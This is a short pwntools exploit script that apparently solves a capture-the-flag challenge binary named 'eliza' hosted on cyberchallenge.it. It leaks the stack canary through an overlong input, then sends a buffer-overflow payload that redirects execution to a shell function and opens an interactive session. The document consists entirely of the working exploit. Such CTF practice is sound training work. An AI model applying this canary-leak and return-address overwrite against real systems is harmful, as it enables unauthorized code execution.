#!/usr/bin/env python3
from pwn import *

bin_name = "./eliza"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b eliza\ncontinue\n')
    elif args.REMOTE:
        return remote("eliza.challs.cyberchallenge.it", 9131)
    else:
        return process(elf.path)

def main():
    shell = 0x400897
    r = conn()
    r.recv()
    r.send(b'a'*73)
    r.recvuntil(b'Sorry, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    canary = r.recvuntil(b'" is too long',drop=True)
    canary = b'\00' + canary[:7]
    canary = u64(canary)
    print(f"canary: {hex(canary)}")
    r.recv()
    payload=b'\0'*72 + p64(canary) + b'a'*8 + p64(shell)
    r.sendline(payload)
    r.recv()
    r.sendline()
    r.interactive()

if __name__ == "__main__":
    main()
